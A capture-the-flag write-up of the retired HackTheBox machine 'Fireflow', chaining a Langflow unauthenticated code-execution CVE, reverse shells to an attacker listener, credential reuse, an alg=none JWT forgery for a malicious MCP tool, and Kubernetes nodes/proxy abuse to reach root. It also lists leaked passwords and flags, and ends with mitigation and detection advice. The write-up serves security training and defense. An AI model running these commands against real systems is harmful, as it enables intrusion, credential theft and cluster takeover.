# Fireflow

| Field | Value |
|---|---|
| Author | mirsceacac |
| Platform | HackTheBox |
| Category & Difficulty | Web / Cloud (Kubernetes), Medium |
| Status | Retired |
| Date | 2026-11-01 |
| Skills exercised | CVE chaining, credential reuse, JWT `alg=none` forgery, Kubernetes RBAC abuse (`nodes/proxy`), privileged pod escape |

> **Note on instance-specific values.** The `flow_id`, pod name, and target IP below are from one HTB instance seed. On a fresh spawn they will differ — every command that depends on them is flagged with `# instance-specific`. The attacker IP (`10.10.15.78`) and port (`9001`) are what I used; change freely.

## TL;DR

A wildcard TLS cert leaked a hidden vHost (`flow.fireflow.htb`) running a Langflow instance whose "Open Agent" button exposed a public `flow_id`. Chaining **CVE-2026-33017** (unauthenticated RCE via `/api/v1/build_public_tmp/<flow_id>/flow`) gave a `www-data` shell; a Langflow `.env` password was reused by local user `nightfall`. From `nightfall`, a leaked MCP config exposed a JWT service that accepted `alg=none` — forging an admin token let me register a malicious tool and land a shell in the `mcp-server` pod. The pod's service account had `get nodes/proxy`, and a privileged `node-exporter` DaemonSet with `/` mounted at `/host` provided a direct path to root on the node.

## Reconnaissance & Enumeration

- `nmap -sCV -p 22,80,443 -Pn 10.129.244.214` → **22/ssh** OpenSSH 9.6p1, **80/http** closed, **443/https** nginx with cert `CN=fireflow.htb`, **SAN `DNS:fireflow.htb, DNS:*.fireflow.htb`**. The wildcard SAN hinted there was at least one subdomain worth finding.
- Added `10.129.244.214 fireflow.htb` to `/etc/hosts`. Visiting `https://fireflow.htb` showed a marketing page titled *FireFlow — Task Force Nightfall* with a single interesting button: **Open Agent**.
- Clicking **Open Agent** in Firefox (accepting the self-signed cert) redirected to `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25` → added `flow.fireflow.htb` to `/etc/hosts`. The UUID in the path is the leaked `flow_id`. *(Instance-specific)*
- `curl -sk https://flow.fireflow.htb/api/v1/flows/` returned `{"detail":"No authentication credentials provided"}` → the instance is authenticated, but the *playground build* endpoint is intentionally public. That's the target.
- Grepping the SPA bundle (`/assets/index-*.js`) for UUIDs found only analytics constants — the `flow_id` is fetched at runtime, not baked into JS. Confirmed the redirect from the "Open Agent" button is the reliable source.

**Dead ends:** vhost fuzzing with default wordlists found nothing beyond `flow.`; `/api/v1/config`, `/api/v1/version`, `/api/v2/files` all required auth. Focused on the public build endpoint instead.

## Vulnerability Analysis

- **Identified:** **CVE-2026-33017** — Langflow's public build endpoint `POST /api/v1/build_public_tmp/<flow_id>/flow` accepts a fully attacker-supplied flow graph. Any node with a `code` template gets compiled and executed server-side, so a valid public `flow_id` is sufficient precondition. No auth, no CSRF token (the endpoint accepts a dummy `client_id` cookie).
- **Confirmed manually:** before firing a reverse-shell payload, I POSTed a node with `code.value = "import os; print(os.getuid())"` and the server compiled it without error. Replacing the body with an `os.system()` reverse-shell landed a `www-data` shell.
- **Impact:** unauthenticated RCE as the Langflow service user — `www-data` on this host, with read access to `/etc/langflow/.env`.

## Exploitation & Post-Exploitation

1. **Initial access — CVE-2026-33017.** Chose this over vhost/directory attacks because the endpoint was explicitly public *and* the `flow_id` was leaked on the marketing page. The payload is a JSON flow graph with a single `code` node whose `value` runs a bash reverse shell. I keep it as a template with `__LHOST__`/`__LPORT__` placeholders so the same file works on any instance.

   ```bash
   # terminal 1 — start the listener
   nc -lvnp 9001

   # terminal 2 — materialize the payload and fire it
   ATTACKER=10.10.15.78            # <-- your tun0 IP
   LPORT=9001
   FLOW_ID=7d84d636-af65-42e4-ac38-26e867052c25   # <-- instance-specific

   sed -e "s/__LHOST__/${ATTACKER}/" -e "s/__LPORT__/${LPORT}/" \
       scripts/cve-2026-33017-payload.json.template > /tmp/payload.json

   curl -sk -X POST \
     "https://flow.fireflow.htb/api/v1/build_public_tmp/${FLOW_ID}/flow" \
     -H 'Content-Type: application/json' \
     -b 'client_id=attacker' \
     -d @/tmp/payload.json
   ```

   The response hangs while the shell is open — that's expected. `nc` in terminal 1 catches a `www-data` shell.

2. **Foothold — stabilize.** The reverse shell is a raw PTY-less bash; upgrade it for job control and TUIs.

   ```bash
   script /dev/null -c bash
   # Ctrl-Z
   stty raw -echo; fg
   # Enter twice
   ```

3. **Credential harvest — `/etc/langflow/.env`.** Langflow's config leaks the superuser password. `/etc/passwd` shows local user `nightfall` (UID 1000) — test reuse before anything else.

   ```bash
   cat /etc/langflow/.env
   # LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
   grep nightfall /etc/passwd
   ```

4. **Lateral movement — SSH as `nightfall`.** Password reuse confirmed.

   ```bash
   ssh nightfall@fireflow.htb
   # password: n1ghtm4r3_b4_n1ghtf4ll
   cat ~/user.txt
   ```

5. **Lateral movement — MCP server / JWT `alg=none`.** `~/.mcp/config.json` leaks a service account for an MCP tool registry on port `30080`. Its `/api/v1/version` advertises `supported_algorithms: ["HS256","none"]`. The plan: log in with the leaked creds, note the token is `role=user`, then forge a fresh token with `alg=none` and `role=admin`. The registry accepts it because `none` is explicitly enabled and the signature is empty (a bare trailing dot).

   ```bash
   cat ~/.mcp/config.json
   # {"server":"http://10.129.244.214:30080","user":"langflow-bot",
   #  "password":"Langfl0w@mcp2026!"}

   curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool

   # prove we're 'user', not admin
   USER_JWT=$(curl -s -X POST http://10.129.244.214:30080/api/v1/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' \
     | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
   curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer ${USER_JWT}" \
     -d '{"name":"t","description":"t","code":"print(1)"}'
   # {"detail":"Admin role required"}

   # forge an admin token
   ADMIN_JWT=$(python3 scripts/forge_jwt.py)
   ```

   Register a malicious tool whose `code` opens a socket and spawns a shell, then invoke it via JSON-RPC `tools/call`.

   ```bash
   # terminal 1 — new listener for the pod shell
   nc -lvnp 9001

   # terminal 2 — register and trigger
   sed -e "s/__LHOST__/${ATTACKER}/" -e "s/__LPORT__/${LPORT}/" \
       scripts/mcp_shell_tool.json.template > /tmp/mcp_shell.json

   curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer ${ADMIN_JWT}" \
     -d @/tmp/mcp_shell.json
   # {"status":"registered","name":"shell"}

   curl -s -X POST http://10.129.244.214:30080/mcp \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer ${ADMIN_JWT}" \
     -d '{"jsonrpc":"2.0","id":4,"method":"tools/call",
          "params":{"name":"shell","arguments":{}}}'
   ```

   `nc` catches a shell as `mcp` in `mcp-server-54464cb475-29ztf`. Stabilize again with the same `script`/`stty` dance.

6. **Privilege escalation — Kubernetes `nodes/proxy`.** Inside the pod, the SA token lives at `/var/run/secrets/kubernetes.io/serviceaccount/token`. First check what the SA can do:

   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   API=https://10.43.0.1:443

   curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
     -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"apiVersion":"authorization.k8s.io/v1",
          "kind":"SelfSubjectRulesReview",
          "spec":{"namespace":"default"}}' \
     | python3 -m json.tool | grep -A6 'nodes/proxy'
   ```

   The SA has `get nodes/proxy` — that's effectively Kubelet API access from the pod network. Enumerate pods through the Kubelet and look for privileged pods with `hostPath` volumes:

   ```bash
   curl -sk "https://10.129.244.214:10250/pods" \
     -H "Authorization: Bearer $TOKEN" | python3 -c '
   import sys, json
   d = json.load(sys.stdin)
   for it in d["items"]:
       ns   = it["metadata"]["namespace"]
       nm   = it["metadata"]["name"]
       vols = [v for v in it["spec"].get("volumes", []) if "hostPath" in v]
       for c in it["spec"]["containers"]:
           sc = c.get("securityContext", {})
           if sc.get("privileged") and vols:
               paths = [v["hostPath"]["path"] for v in vols]
               print(f"{ns}/{nm} container={c[chr(39)+chr(39)] if False else c[\"name\"]} hostPaths={paths}")
   '
   ```

   > *Self-edit note:* the f-string-with-backslash issue hit me live — `c["name"]` inside an f-string expression is illegal in Python 3.11. Simplest fix: extract to a variable first.

   ```bash
   curl -sk "https://10.129.244.214:10250/pods" \
     -H "Authorization: Bearer $TOKEN" | python3 -c '
   import sys, json
   d = json.load(sys.stdin)
   for it in d["items"]:
       ns   = it["metadata"]["namespace"]
       nm   = it["metadata"]["name"]
       vols = [v for v in it["spec"].get("volumes", []) if "hostPath" in v]
       for c in it["spec"]["containers"]:
           sc = c.get("securityContext", {})
           if sc.get("privileged") and vols:
               paths = [v["hostPath"]["path"] for v in vols]
               cname = c["name"]
               print(f"{ns}/{nm} container={cname} hostPaths={paths}")
   '
   # monitoring/prometheus-prometheus-node-exporter-nmntq container=node-exporter \
   #   hostPaths=['/proc', '/sys', '/']              # <-- instance-specific
   ```

   The `/` hostPath is mounted at `/host` inside the pod, so reading `/host/root/root/root.txt` reaches the node's real `/root/root.txt`.

   `/run/...` requires `create` on `nodes/proxy` — this SA only has `get`:

   ```bash
   curl -sk -X POST \
     "https://10.129.244.214:10250/run/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter" \
     -H "Authorization: Bearer $TOKEN" \
     -d 'cmd=id'
   # Forbidden (verb=create, nodes/proxy)
   ```

   `/exec/...` uses `get` and works. The Kubelet `/exec` endpoint is a WebSocket speaking the `v4.channel.k8s.io` subprotocol — `kube_exec.py` is a small wrapper around `websockets` that pipes channel-1 output (stdout) back to the terminal.

   ```bash
   # on the attacker
   python3 -m http.server 80

   # inside the mcp pod
   cd /tmp
   curl <ATTACKER_IP>/kube_exec.py -o kube_exec.py
   # edit NE_POD / NE_NS / NE_CNT at the top of the file first (instance-specific)
   python3 kube_exec.py "id"
   # uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
   python3 kube_exec.py "cat /host/root/root/root.txt"
   ```

## Flags

| Flag | Value | Location |
|---|---|---|
| User | `025610d138340f30be3b3309a244ef87` | `/home/nightfall/user.txt` |
| Root | `1dd77fd71f44895fa4d18ab2b75f33e8` | `/host/root/root/root.txt` (node path: `/root/root.txt`) |

## Lessons Learned

- **Pattern:** Public "preview/playground/run" endpoints are a top-tier RCE surface. Any button that redirects to a UUID-bearing URL is the attack key — grab the UUID from the redirect, not the JS bundle. Even if `GET /api/v1/flows/` is auth-protected, the *build* path for the same flow ID often isn't.
- **Pattern:** JWT services that *list* `none` in `supported_algorithms` almost always honor it. The forgery must end with a bare trailing dot (`header.payload.`) — an empty signature, not a missing one.
- **Cloud method:** `get nodes/proxy` is silent Kubelet-API access — not just pod listing. If `/run` returns `Forbidden (verb=create)`, pivot to `/exec` (WebSocket, verb `get`). Read `selfsubjectrulesreviews` *before* probing endpoints so you know which verb you have.
- **Method:** The fastest credential harvest after any shell is `find / -maxdepth 5 \( -name '.env' -o -name 'config.json' -o -name '*.yaml' \)` limited to app dirs — `.env`, `~/.mcp/`, `~/.kube/`, `~/.aws/` are the high-value hits.
- **Tooling:** Write JSON payloads to a file and POST with `-d @file`. Pasting multi-line JSON into zsh inside single quotes is where all my dead time went. Pair this with `sed -e 's/__LHOST__/…/' template > /tmp/x.json` so templates stay reusable and never accidentally commit an attacker IP.

## Mitigation & Detection

**Fix**
- **Langflow:** upgrade past the CVE-2026-33017 fix. Interim: ingress 403 on `/api/v1/build_public_tmp/*`, and don't publish `flow_id`s in "Open Agent" links.
- **JWT service:** reject `alg=none` unconditionally; pin the accepted algorithm to `HS256` with a strong secret; derive role server-side, not from the token claim.
- **Kubernetes RBAC:** remove `get nodes/proxy` from application SAs (this verb effectively grants Kubelet API access, bypassing the API server). If the app truly needs pod exec, grant scoped `pods/exec` via a Role bound to the SA.
- **Node-exporter:** the `prometheus-node-exporter` DaemonSet should not be `privileged: true` with `hostPath: /`. Use `hostNetwork`/`hostPID` if needed and mount only `/proc` and `/sys` read-only — never `/`.
- **App config:** do not reuse service passwords as OS user passwords. `n1ghtm4r3_b4_n1ghtf4ll` from `.env` should never match a Linux login.

**Detect**
- **Langflow:** ingress log for `POST /api/v1/build_public_tmp/` from non-Langflow source IPs; alert on `code` values containing `os.system`, `subprocess`, `pty.spawn`, `/dev/tcp`, or `socket.connect`.
- **JWT:** auth-service log for tokens whose `alg` header ≠ the configured algorithm — alert on `alg=none` specifically.
- **MCP tool registration:** audit `POST /api/v1/tools` for admin-authored tools whose `code` contains `socket`, `pty`, or `subprocess`.
- **Kubernetes:** audit rule for `get nodes/proxy` from any SA (`/api/v1/nodes/*/proxy/*` in the API server audit log). Falco/`auditd` on `kubectl exec`-style calls to `monitoring/*` pods and on `/proc` process starts from `node-exporter` containers.
